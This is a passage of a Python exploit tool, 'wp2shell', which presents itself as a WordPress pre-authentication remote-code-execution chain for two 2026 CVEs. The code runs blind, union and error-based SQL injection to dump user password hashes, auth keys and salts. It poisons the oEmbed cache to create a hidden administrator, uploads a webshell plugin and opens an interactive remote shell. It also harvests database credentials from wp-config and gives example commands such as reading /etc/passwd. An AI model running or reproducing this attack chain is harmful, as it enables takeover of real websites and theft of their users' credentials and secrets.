        files: Dict[str, Tuple[str, bytes]],
    ) -> Tuple[bytes, str]:
        boundary = "----wp2s" + secrets.token_hex(16)
        buf = io.BytesIO()
        for name, value in fields.items():
            buf.write(f"--{boundary}\r\n".encode())
            buf.write(f'Content-Disposition: form-data; name="{name}"'
                      f"\r\n\r\n{value}\r\n".encode())
        for name, (filename, data) in files.items():
            buf.write(f"--{boundary}\r\n".encode())
            buf.write(
                f'Content-Disposition: form-data; name="{name}"; '
                f'filename="{filename}"\r\n'
                f"Content-Type: application/octet-stream\r\n\r\n".encode())
            buf.write(data + b"\r\n")
        buf.write(f"--{boundary}--\r\n".encode())
        return buf.getvalue(), f"multipart/form-data; boundary={boundary}"

    def _get(self, path: str) -> str:
        try:
            resp = self._opener.open(
                urllib.request.Request(self.base_url + path),
                timeout=self.timeout)
            return resp.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as exc:
            return exc.read().decode("utf-8", "replace")

    def _post(self, path: str, data: dict) -> str:
        req = urllib.request.Request(
            self.base_url + path,
            data=urllib.parse.urlencode(data).encode(),
            method="POST",
        )
        try:
            resp = self._opener.open(req, timeout=self.timeout)
            return resp.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as exc:
            return exc.read().decode("utf-8", "replace")


# ═══════════════════════════════════════════════════════════════════════════════
# Commands
# ═══════════════════════════════════════════════════════════════════════════════

def cmd_check(args: argparse.Namespace) -> int:
    """Non-destructive vulnerability confirmation."""
    client = Client(args.url, timeout=args.timeout, proxy=args.proxy)
    info(f"Target: {client.base_url}")

    version = detect_version(client)
    if version:
        info(f"WordPress version: {version}")

    info("Testing batch endpoint...")
    try:
        resp = client.batch({"requests": []})
    except TargetError as e:
        bad(f"Batch endpoint unreachable: {e}")
        return 1

    if resp.status != 207:
        bad(f"Batch returned HTTP {resp.status} (expected 207)")
        return 1
    good("Batch endpoint accessible (HTTP 207)")

    desync = Desync(client)
    blind = BlindExtractor(desync)

    info("Testing boolean oracle...")
    if blind.available():
        good("VULNERABLE — boolean blind SQLi confirmed")
    else:
        bad("Boolean oracle failed — target may be patched")
        return 1

    if args.confirm_timing:
        info(f"Testing timing oracle (SLEEP {args.sleep}s)...")
        baseline, delayed = blind.confirm_timing(args.sleep)
        delta = delayed - baseline
        if delta >= args.sleep * 0.65:
            good(f"Timing confirmed — baseline {baseline:.2f}s, "
                 f"delayed {delayed:.2f}s (delta {delta:.2f}s)")
        else:
            warn(f"Timing weak — delta {delta:.2f}s < expected "
                 f"{args.sleep * 0.65:.2f}s (network jitter?)")

    if args.confirm_union:
        info("Testing UNION extraction...")
        union = UnionExtractor(desync)
        if union.available():
            good("UNION extraction confirmed (in-band read)")
        else:
            info("UNION extraction not available (split active or errors hidden)")

    embed_url = find_embed_url(client)
    detail(f"Embed URL candidate: {embed_url}")
    detail(f"Total requests: {client.request_count}")
    return 0


def cmd_read(args: argparse.Namespace) -> int:
    """Extract data from the database."""
    client = Client(args.url, timeout=args.timeout, proxy=args.proxy)
    info(f"Target: {client.base_url}")

    desync = Desync(client)

    if args.technique == "auto":
        extractor = select_extractor(desync)
    elif args.technique == "union":
        extractor = UnionExtractor(desync)
        if not extractor.available():
            bad("UNION extraction not available on this target")
            return 1
    elif args.technique == "error":
        extractor = ErrorExtractor(desync)
        if not extractor.available():
            bad("Error-based extraction not available")
            return 1
    else:
        extractor = BlindExtractor(desync)
        if not extractor.available():
            bad("Blind extraction failed — target may be patched")
            return 1

    if extractor is None:
        bad("No extraction technique available")
        return 1

    good(f"Using {extractor.technique} extraction")

    prefix = args.prefix
    if args.auto_prefix:
        prefix = discover_prefix(extractor, args.prefix)
        good(f"Table prefix: {prefix}")

    if args.query:
        info(f"Extracting: {args.query}")
        value = extractor.extract(args.query, max_length=args.max_length,
                                  on_char=lambda s: progress(s))
        clear_progress()
        if value is not None:
            good(f"Result: {value}")
            print(value)
        else:
            bad("Extraction returned no data")
            return 1

    elif args.preset == "fingerprint":
        for label, expr in [
            ("MySQL version", "SELECT @@version"),
            ("Current user", "SELECT CURRENT_USER()"),
            ("Database name", "SELECT DATABASE()"),
        ]:
            progress(f"{label}...")
            value = extractor.extract(expr, max_length=64,
                                      on_char=lambda s: progress(s))
            clear_progress()
            good(f"{label}: {value}")

    elif args.preset == "users":
        info(f"Extracting users from {prefix}users...")
        count = extractor.integer(f"SELECT COUNT(*) FROM {prefix}users")
        detail(f"{count} user(s) found")
        for offset in range(count):
            progress(f"user {offset + 1}/{count}...")
            row = extractor.extract(
                f"SELECT CONCAT_WS(0x7c,ID,user_login,user_pass) "
                f"FROM {prefix}users ORDER BY ID LIMIT {offset},1",
                max_length=args.max_length,
                on_char=lambda s: progress(s))
            clear_progress()
            good(row)
        print(file=sys.stderr)
        detail("Formats: $P$ = phpass/MD5 (hashcat -m 400)")
        detail("         $wp$ = bcrypt/WP6.8+ (hashcat -m 3200)")

    elif args.preset == "secrets":
        info(f"Reading auth secrets from {prefix}options...")
        for key in ["auth_key", "secure_auth_key", "logged_in_key",
                    "nonce_key", "auth_salt", "secure_auth_salt",
                    "logged_in_salt", "nonce_salt"]:
            progress(f"{key}...")
            value = extractor.extract(
                f"SELECT option_value FROM {prefix}options "
                f"WHERE option_name='{key}'",
                max_length=96,
                on_char=lambda s: progress(s))
            clear_progress()
            if value:
                good(f"{key}: {value}")
            else:
                detail(f"{key}: (in wp-config.php, not DB)")

    elif args.preset == "config":
        info(f"Reading site configuration from {prefix}options...")
        for key in ["siteurl", "blogname", "admin_email", "template",
                    "active_plugins", "permalink_structure"]:
            progress(f"{key}...")
            value = extractor.extract(
                f"SELECT option_value FROM {prefix}options "
                f"WHERE option_name='{key}'",
                max_length=args.max_length,
                on_char=lambda s: progress(s))
            clear_progress()
            good(f"{key}: {value}")

    print(file=sys.stderr)
    detail(f"Requests: {client.request_count} "
           f"({extractor.technique} extraction)")
    return 0


def _auto_get_wp_data(session, shell_path, prefix, admin_id) -> Dict[str, Any]:
    """Auto-extract WordPress data after exploitation: users, secrets, config."""
    results: Dict[str, Any] = {}

    # --- Extract users ---
    info("Auto-extracting users...")
    try:
        count = session.run(shell_path,
            f"cd ../../.. && php -r \"require_once 'wp-load.php'; "
            f"\\$u=get_users(); echo count(\\$u);\""
        )
        user_count = int(count.strip()) if count and count.strip().isdigit() else 0
    except Exception:
        user_count = 0

    if user_count > 0:
        info(f"Found {user_count} user(s), dumping credentials...")
        for offset in range(user_count):
            row = session.run(shell_path,
                f"cd ../../.. && php -r \"require_once 'wp-load.php'; "
                f"\\$u=get_user_by('id',{offset+1}); "
                f"if(\\$u) echo \\$u->ID.'|'.\\$u->user_login.'|'.\\$u->user_pass;\""
            )
            if row and '|' in row:
                good(f"  User: {row.strip()}")
                results.setdefault("users", []).append(row.strip())

    # --- Extract secrets (auth keys) ---
    info("Auto-extracting auth secrets...")
    for key in ["auth_key", "secure_auth_key", "logged_in_key",
                "nonce_key", "auth_salt", "secure_auth_salt",
                "logged_in_salt", "nonce_salt"]:
        val = session.run(shell_path,
            f"cd ../../.. && php -r \"require_once 'wp-config.php'; "
            f"echo defined('{key}') ? {key} : 'NOT_DEFINED';\""
        )
        if val and "NOT_DEFINED" not in val:
            good(f"  {key}: {val.strip()}")
            results[key] = val.strip()

    # --- Extract config ---
    info("Auto-extracting site configuration...")
    for key in ["siteurl", "blogname", "admin_email", "template",
                "active_plugins", "permalink_structure",
                "DB_NAME", "DB_USER", "DB_PASSWORD", "DB_HOST"]:
        val = session.run(shell_path,
            f"cd ../../.. && php -r \"require_once 'wp-config.php'; "
            f"echo defined('{key}') ? {key} : 'NOT_DEFINED';\""
        )
        if val and "NOT_DEFINED" not in val:
            good(f"  {key}: {val.strip()}")
            results[f"cfg_{key}"] = val.strip()

    # --- System info ---
    info("Gathering system info...")
    uid = session.run(shell_path, "id")
    if uid:
        good(f"  UID: {uid.strip()}")
        results["uid"] = uid.strip()

    uname = session.run(shell_path, "uname -a")
    if uname:
        good(f"  Kernel: {uname.strip()}")
        results["kernel"] = uname.strip()

    # --- WordPress version ---
    wp_ver = session.run(shell_path,
        f"cd ../../.. && php -r \"require_once 'wp-load.php'; "
        f"echo bloginfo('version');\""
    )
    if wp_ver:
        good(f"  WP Version: {wp_ver.strip()}")
        results["wp_version"] = wp_ver.strip()

    return results


def cmd_exploit(args: argparse.Namespace) -> int:
    """Full pre-auth RCE: SQLi → cache poison → re-entry → admin → shell.

    After exploitation, automatically drops into interactive shell and
    extracts WordPress data (users, secrets, config, system info).
    """
    total = 7
    client = Client(args.url, timeout=args.timeout, proxy=args.proxy)

    # Step 1: Probe
    step(1, total, "Reconnaissance")
    info(f"Target: {client.base_url}")

    version = detect_version(client)
    if version:
        info(f"WordPress {version}")

    desync = Desync(client)
    extractor = select_extractor(desync)
    if extractor is None:
        bad("Target is not vulnerable (no extraction available)")
        return 1

    # Step 2: Discovery
    step(2, total, "Enumerating target")
    prefix = args.prefix
    if not args.no_discover:
        prefix = discover_prefix(extractor, args.prefix)
        if prefix != args.prefix:
            good(f"Discovered table prefix: {prefix}")

    admin_id = 1
    if not args.no_discover:
        admin_id = discover_admin_id(extractor, prefix)
        if admin_id != 1:
            good(f"Discovered admin ID: {admin_id}")
        else:
            info("Using admin ID: 1")

    # Step 3: Find embed URL
    step(3, total, "Locating embed target")
    embed_url = find_embed_url(client)
    if not embed_url:
        bad("No published post found for oEmbed (target needs >=1 post)")
        return 1
    good(f"Embed URL: {embed_url}")

    token = secrets.token_hex(6)

    # Step 4: Seed oEmbed
    step(4, total, "Seeding oEmbed cache posts")
    exploiter = Exploiter(client, prefix=prefix)
    if not exploiter.seed_oembed(embed_url, token):
        bad("oEmbed seeding failed")
        return 1
    good("Seed payload delivered")
    time.sleep(0.5)

    # Step 5: Extract IDs
    step(5, total, "Extracting cache post IDs")
    cache_ids = exploiter.extract_cache_ids(embed_url, token, extractor)
    if not cache_ids:
        bad("Could not find oEmbed cache posts in database")
        detail("Ensure the target has at least one published post")
        detail("and no persistent object cache (Redis/Memcached)")
        return 1
    good(f"Cache IDs: {cache_ids}")

    # Step 6: Escalate
    step(6, total, "Triggering escalation chain")
    username = "wp_service_" + secrets.token_hex(3)
    password = secrets.token_urlsafe(20)
    email = f"{username}@service.localhost"

    info(f"Creating admin: {username}")
    debug(f"Password: {password}")

    if not exploiter.escalate(cache_ids, embed_url, token, admin_id,
                              username, password, email):
        bad("Escalation chain failed")
        detail("Possible causes:")
        detail("  - Pretty permalinks not enabled")
        detail("  - Persistent object cache active")
        detail("  - WAF blocking the SQLi payload")
        detail("  - Target already patched (6.9.5+)")
        return 1
    good("Administrator created via re-entry chain")

    # Step 7: Deploy shell
    step(7, total, "Deploying webshell")
    session = AdminSession(client.base_url, timeout=client.timeout,
                           proxy=args.proxy)
    if not session.login(username, password):
        bad("Login failed (unexpected — user was created)")
        return 1
    good("Authenticated")

    shell_path = session.deploy_webshell()
    if not shell_path:
        bad("Plugin upload failed")
        return 1

    output = session.run(shell_path, "id")
    if not output:
        bad("Webshell not responding")
        return 1
    good("RCE confirmed")
    detail(f"uid: {output.strip()}")

    print(file=sys.stderr)
    good("=" * 56)
    good(f"  TARGET COMPROMISED")
    good(f"  Admin:  {username} / {password}")
    good(f"  Shell:  {client.base_url}{shell_path}")
    good("=" * 56)
    print(file=sys.stderr)

    # ===== AUTO SHELL + AUTO GET WP =====
    if not args.no_auto:
        info("=" * 40)
        info("AUTO MODE: Shell + WP Data Extraction")
        info("=" * 40)

        # Auto-execute single command if provided
        if args.command:
            info(f"Executing command: {args.command}")
            result = session.run(shell_path, args.command)
            if result:
                print(result.rstrip("\n"))

        # Auto-extract WordPress data
        wp_data = _auto_get_wp_data(session, shell_path, prefix, admin_id)

        # Auto interactive shell (drop into shell)
        if args.interactive or not args.command:
            _interactive_shell(session, shell_path)

        # Save auto-extracted data
        if wp_data:
            output_dir = args.auto_output or "wp2shell_auto_dump"
            os.makedirs(output_dir, exist_ok=True)
            dump_file = os.path.join(output_dir,
                                     f"{client.base_url.replace('://','_').replace('/','_')}.json")
            with open(dump_file, 'w') as f:
                json.dump(wp_data, f, indent=2)
            good(f"Auto-dump saved to: {dump_file}")

        if args.cleanup:
            info("Cleaning up...")
            if session.delete_user(shell_path, username, reassign_to=admin_id):
                good("Created user deleted")
            else:
                warn(f"User cleanup failed — manual: {username}")
            if session.cleanup(shell_path):
                good("Webshell removed")
            else:
                warn(f"Webshell cleanup failed — manual: {shell_path}")

        return 0
    else:
        # Manual mode (original behavior)
        if args.command:
            result = session.run(shell_path, args.command)
            if result:
                print(result.rstrip("\n"))

        if args.interactive:
            _interactive_shell(session, shell_path)

        if args.cleanup:
            info("Cleaning up...")
            if session.delete_user(shell_path, username, reassign_to=admin_id):
                good("Created user deleted")
            else:
                warn(f"User cleanup failed — manual: {username}")
            if session.cleanup(shell_path):
                good("Webshell removed")
            else:
                warn(f"Webshell cleanup failed — manual: {shell_path}")

        return 0


def cmd_shell(args: argparse.Namespace) -> int:
    """Authenticated shell (requires credentials)."""
    session = AdminSession(args.url, timeout=args.timeout, proxy=args.proxy)

    info(f"Authenticating as {args.user}...")
    if not session.login(args.user, args.password):
        bad("Login failed")
        return 1
    good("Authenticated")

    info("Deploying webshell...")
    shell_path = session.deploy_webshell()
    if not shell_path:
        bad("Plugin upload failed (check permissions)")
        return 1
    good(f"Shell: {args.url.rstrip('/')}{shell_path}")

    output = session.run(shell_path, "id")
    if not output:
        bad("Webshell not responding")
        return 1
    detail(f"uid: {output.strip()}")

    if args.command:
        result = session.run(shell_path, args.command)
        if result:
            print(result.rstrip("\n"))
    elif args.interactive:
        _interactive_shell(session, shell_path)
    else:
        _interactive_shell(session, shell_path)

    if args.cleanup:
        info("Cleaning up...")
        if session.cleanup(shell_path):
            good("Webshell removed")
        else:
            warn("Webshell cleanup failed")

    return 0


def _interactive_shell(session: AdminSession, shell_path: str) -> None:
    """CWD-tracking interactive shell over the webshell."""
    cwd = session.run(shell_path, "pwd")
    if not cwd:
        bad("Shell not responding")
        return
    cwd = cwd.strip() or "/"

    info("Interactive shell — type 'exit' or Ctrl-D to quit")
    print(file=sys.stderr)

    cwd_marker = "__wp2scwd__"
    while True:
        try:
            prompt = _c("36", f"{cwd}") + _c("0", " $ ") if _TTY else f"{cwd} $ "
            line = input(prompt)
        except (EOFError, KeyboardInterrupt):
            print(file=sys.stderr)
            return

        command = line.strip()
        if not command:
            continue
        if command in ("exit", "quit"):
            return

        full_cmd = (
            f"cd {shlex.quote(cwd)} 2>/dev/null; {command}; "
            f"printf '{cwd_marker}%s' \"$(pwd)\""
        )
        out = session.run(shell_path, full_cmd)
        if out is None:
            bad("no response")
            continue

        body, marker, tail = out.rpartition(cwd_marker)
        if marker:
            cwd = tail.strip() or cwd
            out = body

        out = out.rstrip("\n")
        if out:
            print(out)


# ═══════════════════════════════════════════════════════════════════════════════
# CLI Parser
# ═══════════════════════════════════════════════════════════════════════════════

def _add_common(p: argparse.ArgumentParser) -> None:
    p.add_argument("url", help="target WordPress URL")
    p.add_argument("--timeout", type=float, default=30.0,
                   help="HTTP timeout in seconds (default: 30)")
    p.add_argument("--proxy",
                   help="HTTP proxy (e.g. http://127.0.0.1:8080)")
    p.add_argument("-v", "--verbose", action="store_true",
                   help="enable debug output")
    p.add_argument("-q", "--quiet", action="store_true",
                   help="suppress banner and info messages")


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="wp2shell",
        description=(
            "WordPress Pre-Auth RCE — "
            "CVE-2026-63030 + CVE-2026-60137"
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "examples:\n"
            "  wp2shell check  http://target\n"
            "  wp2shell read   http://target --preset users\n"
            "  wp2shell read   http://target --query \"SELECT @@version\"\n"
            "  wp2shell exploit http://target -i\n"
            "  wp2shell exploit http://target --command 'cat /etc/passwd'\n"
        ),
    )
    parser.add_argument("-V", "--version", action="version",
                        version=f"wp2shell {__version__}")
    sub = parser.add_subparsers(dest="subcommand")

    # -- check --
    p_check = sub.add_parser(
        "check", help="non-destructive vulnerability confirmation")
    _add_common(p_check)
    p_check.add_argument("--confirm-timing", action="store_true",
                         help="include SLEEP-based timing test")
    p_check.add_argument("--confirm-union", action="store_true",
                         help="test UNION extraction availability")
    p_check.add_argument("--sleep", type=float, default=3.0,
                         help="SLEEP seconds for timing (default: 3)")

    # -- read --
    p_read = sub.add_parser(
        "read", help="extract data via SQL injection")
    _add_common(p_read)
    p_read.add_argument("--prefix", default="wp_",
                        help="table prefix (default: wp_)")
    p_read.add_argument("--auto-prefix", action="store_true",
                        help="auto-discover table prefix")
    p_read.add_argument("--max-length", type=int, default=128,
                        help="max chars per value (default: 128)")
    p_read.add_argument("--technique",
                        choices=("auto", "union", "error", "blind"),
                        default="auto",
                        help="extraction technique (default: auto)")
    group = p_read.add_mutually_exclusive_group()
    group.add_argument("--preset",
                       choices=("fingerprint", "users", "secrets", "config"),
                       default="fingerprint",
                       help="data preset (default: fingerprint)")
    group.add_argument("--query",
                       help="arbitrary SQL expression to extract")

    # -- exploit --
    p_exploit = sub.add_parser(
        "exploit", help="full pre-auth RCE chain")
    _add_common(p_exploit)
    p_exploit.add_argument("--prefix", default="wp_",
                           help="table prefix (default: wp_)")
    p_exploit.add_argument("--no-discover", action="store_true",
                           help="skip auto-discovery (use defaults)")
    p_exploit.add_argument("-i", "--interactive", action="store_true",
                           help="drop into shell after exploitation")
    p_exploit.add_argument("-c", "--command",
                           help="execute single command after exploitation")
    p_exploit.add_argument("--cleanup", action="store_true",
                           help="delete created user and webshell on exit")
    p_exploit.add_argument("--no-auto", action="store_true",
                           help="skip auto shell and WP data extraction (manual mode)")
    p_exploit.add_argument("--auto-output", default="wp2shell_auto_dump",
                           help="output dir for auto-dumped WP data (default: wp2shell_auto_dump)")

    # -- shell --
    p_shell = sub.add_parser(
        "shell", help="deploy webshell with existing credentials")
    _add_common(p_shell)
    p_shell.add_argument("--user", required=True, help="admin username")
    p_shell.add_argument("--password", required=True, help="admin password")
    p_shell.add_argument("-i", "--interactive", action="store_true",
                         help="interactive shell mode")
    p_shell.add_argument("-c", "--command", help="single command to execute")
    p_shell.add_argument("--cleanup", action="store_true",
                         help="remove webshell on exit")

    return parser


# ═══════════════════════════════════════════════════════════════════════════════
# Entry Point
# ═══════════════════════════════════════════════════════════════════════════════

def main() -> int:
    global _VERBOSE, _QUIET
    parser = build_parser()
    args = parser.parse_args()

    if not args.subcommand:
        print(_c("35", BANNER) if _TTY else BANNER, file=sys.stderr)
        parser.print_help()
        return 0

    _VERBOSE = getattr(args, "verbose", False)
    _QUIET = getattr(args, "quiet", False)

    if not _QUIET:
        print(_c("35", BANNER) if _TTY else BANNER, file=sys.stderr)

    handlers = {
        "check": cmd_check,
        "read": cmd_read,
        "exploit": cmd_exploit,
        "shell": cmd_shell,
    }

    try:
        return handlers[args.subcommand](args)
    except TargetError as e:
        bad(f"Connection failed: {e}")
        return 1
    except KeyboardInterrupt:
        print(file=sys.stderr)
        return 130
    except Exception as exc:
        bad(f"Unhandled error: {exc}")
        if _VERBOSE:
            import traceback
            traceback.print_exc()
        return 1


if __name__ == "__main__":
    sys.exit(main())

